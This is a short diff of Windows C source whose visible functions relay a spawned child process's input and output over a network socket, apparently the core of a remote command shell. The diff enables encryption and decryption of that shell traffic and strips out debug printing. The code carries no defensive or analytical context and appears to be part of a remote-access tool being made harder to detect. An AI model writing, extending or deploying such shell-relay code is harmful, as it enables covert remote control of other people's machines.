@@ -117,10 +117,10 @@ void sendPipe() { //FUNC TO WRITE TO SOCKET HANDLE
 	for (;;) {
 		PeekNamedPipe(ChildStd_OUT_Rd, NULL, 0, NULL, &bytesavail, 0);
 		if (bytesavail) {
-			bSuccess = ReadFile(ChildStd_OUT_Rd, buff, sizeof(buff), &dwRead, NULL);
+			bSuccess = ReadFile(ChildStd_OUT_Rd, buff, MAX_READ, &dwRead, NULL);
 			if (!bSuccess || dwRead == 0) break; //no data read or read failed
-			//int bytesencrypt = encrypt(buff, dwRead, encrypted); //encrypt data
-			bSuccess = WriteFile((HANDLE)sockt, buff, dwRead, &dwWritten, NULL);
+			int bytesencrypt = encrypt(buff, dwRead, encrypted); //encrypt data
+			bSuccess = WriteFile((HANDLE)sockt, encrypted, bytesencrypt, &dwWritten, NULL);
 		}
 		else break;
 	}
@@ -134,16 +134,15 @@ void recvPipe() { //FUNC FOR READING FROM SOCKET HANDLE
 	ZeroMemory(buff, sizeof(buff));
 	BOOL bSuccess = FALSE;
 	char decrypted[MAX_READ];
+	ZeroMemory(decrypted, MAX_READ);
 	for (;;) {
 		ioctlsocket(sockt, FIONREAD, &bytesavail);
 		if (bytesavail) {
 			bSuccess = ReadFile((HANDLE)sockt, buff, sizeof(buff), &dwRead, NULL);
 			if (!bSuccess || dwRead == 0) break; //if no data is read or readfile fails then break
 
-			//int bytesdecrypt = decrypt(buff, dwRead, decrypted); //decrypt input
-			//printf(buff);
-			//printf("\n");
-			bSuccess = WriteFile(ChildStd_IN_Wr, buff, dwRead, &dwWritten, NULL);
+			int bytesdecrypt = decrypt(buff, dwRead, decrypted); //decrypt input
+			bSuccess = WriteFile(ChildStd_IN_Wr, decrypted, bytesdecrypt, &dwWritten, NULL);
 		}
 		else
 			break;
